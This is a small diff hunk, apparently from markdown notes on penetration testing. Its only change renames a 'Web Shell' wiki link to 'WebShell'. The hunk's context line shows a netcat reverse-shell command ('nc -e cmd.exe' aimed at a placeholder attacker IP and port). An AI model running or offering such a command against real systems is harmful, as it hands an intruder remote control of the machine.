@@ -212,7 +212,7 @@ nc -e cmd.exe <AttackerIP> <Port>
 
 # Web Shell
 
-- [[Web Shell]]
+- [[WebShell]]
 
 ---
 ---
